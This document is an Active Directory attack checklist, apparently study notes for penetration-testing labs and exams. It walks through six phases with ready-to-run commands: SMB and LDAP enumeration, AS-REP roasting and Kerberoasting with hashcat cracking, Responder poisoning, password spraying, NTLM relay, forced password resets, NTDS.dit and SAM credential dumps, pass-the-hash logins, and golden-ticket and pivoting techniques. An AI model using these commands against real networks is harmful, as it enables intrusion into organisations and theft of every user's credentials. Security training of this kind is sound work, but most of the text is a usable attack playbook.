Methodology Over Syntax The exact commands provided here are not 100% absolute and will inevitably vary depending on the target environment, the tools available, and specific network configurations. **Do not just memorize syntax; focus on understanding the structure, the logical flow, and the order of the attack.**

## 📍 Phase 1: Initial Enumeration (Zero Privileges)

_Goal: Enumerate users, policies, and potential quick wins without having any credentials._

- [ ] **Port and Service Scanning (Identify the DC):**

    ```
    nmap -p 53,88,135,139,389,445,464,593,636,3268,3269 -sCV <IP_DC> -oN targeted
    ```

- [ ] **Check for SMB Null Sessions:**

```
  nxc smb <IP_DC> -u '' -p '' --shares
  nxc smb <IP_DC> -u '' -p '' --pass-pol  # Crucial for checking the lockout policy
```

- [ ] **Anonymous LDAP Queries (Anonymous Bind):**
    ```
    ldapsearch -x -H ldap://<IP_DC> -s base namingcontexts
    ldapsearch -x -H ldap://<IP_DC> -b "DC=domain,DC=local" > ldap_dump.txt
    ```
    
## 📍 Phase 2: Initial Access (The First User)
*Goal: Obtain the password or hash of ANY user, no matter how unprivileged they may seem.*

- [ ] **AS-REP Roasting (If a user list was obtained in Phase 1) kerberoasting :**
  Look for users that do not require Kerberos pre-authentication.
```
  impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip <IP_DC>
  # Crack it: hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

- [ ] **LLMNR / NBT-NS Poisoning (Network hash capture):** Listen for lost network requests and force machines to send us their NTLMv2 hash.

```
sudo responder -I eth0 -dwPv
```

  > [!warning] Network Noise
  > Responder is very noisy. In real-world environments, it triggers alarms, but in labs and exams, it is pure gold.

- [ ] **Password Spraying:**
  Test 1 highly probable password (e.g., `Welcome2026!`) against all users, provided the password policy allows it.
```
  nxc smb <IP_DC> -u users.txt -p 'Welcome2026!' --continue-on-success
```

## 📍 Phase 3: Authenticated Enumeration (Mapping the AD)

_Goal: We now have 1 user (even with low privileges). It is time to map the entire Active Directory._

- [ ] **Data Collection for BloodHound (Ingestors):**
```
# From Linux (Impacket)
    bloodhound-python -u 'user' -p 'password' -ns <IP_DC> -d domain.local -c All
# From Windows (if we have a shell)
    Invoke-Bloodhound -CollectionMethod All -Domain domain.local -ZipFileName bh_data.zip
```
- [ ] **Path Analysis with BloodHound:**
  1. Start the database: `sudo neo4j start`
  2. Open BloodHound and upload the collected `.json` files or `.zip` file.
  3. Run the key query: **`Find Shortest Paths to Domain Admins`**.
  4. Analyze the path (the yellow brick road): Do I have `GenericAll` permissions? Can I perform `DCSync`? Am I a local admin on another machine?
- [ ] **Readable Domain Dump (Optional but highly useful):**
  Useful for finding saved passwords in user descriptions.
```
ldapdomaindump -u 'domain.local\user' -p 'password' <IP_DC>
```
## 📍 Phase 4: Lateral Movement & Privilege Escalation (Following the Map)

_Goal: Execute the attacks revealed by BloodHound to escalate privileges or move to other machines._

- [ ] **Kerberoasting:** Request service tickets (TGS) associated with user accounts (SPNs) and crack them offline.
    ```
    impacket-GetUserSPNs domain.local/user:password -dc-ip <IP_DC> -request -outputfile kerberoast_hashes.txt
    # Crack it: hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
    ```

- [ ] **SMB Relay (If SMB Signing is disabled):**
```
  # Edit Responder.conf to turn OFF SMB and HTTP, then run:
  impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

- [ ] **ACL Abuse (Example: Force password change):** If BloodHound shows you have permissions over another user.

    ```
    nxc smb <IP_DC> -u 'my_user' -p 'my_password' --rpc-timeout 60 -x 'net user TargetUser NewPassword123! /domain'
    ```
## 📍 Phase 5: Total Compromise (Domain Admin)
*Goal: You have maximum privileges. It is time to extract everyone's credentials and secure access.*

- [ ] **NTDS.dit Dump (The Holy Grail):**
  Extract the hashes of all users in the domain (requires DA privileges or DCSync replication rights).
```
  impacket-secretsdump domain.local/Administrator:password@<IP_DC> -just-dc
```

- [ ] **SAM Dump (If the target is a local machine):**
    ```
    nxc smb <Target_IP> -u Administrator -p 'password' --sam
    ```
 
  > [!info] SAM vs NTDS.dit
  > The **SAM** stores the local users of that specific machine (e.g., the accounting PC). The **NTDS.dit** lives on the Domain Controller and stores the credentials for the entire network.
- [ ] **Pass-The-Hash (PtH):**
  Use the NTLM hash obtained from the dump to log in anywhere without having to crack it.
```
  evil-winrm -i <IP_DC> -u Administrator -H <NTLM_HASH>
  nxc smb <IP_DC> -u Administrator -H <NTLM_HASH> -x 'whoami'
```

## 📍 Phase 6: Advanced Post-Exploitation (Pivoting)

_Goal: Move to other networks or domains within the corporation._

- [ ] **Review Trust Relationships (Domain Trusts):** Check in BloodHound if the compromised domain has a trust with another domain (e.g., from a "child" domain to a "parent" domain).
    
- [ ] **Trust Attacks (Golden Ticket with SID History):** Forge a Kerberos ticket injecting the SID of the "Enterprise Admins" group from the parent domain to compromise the entire forest.
    
- [ ] **Pivoting to Internal Networks:** Use tools like Chisel or Ligolo-ng to route traffic from your attacking machine, through the compromised Windows machine, into hidden subnets.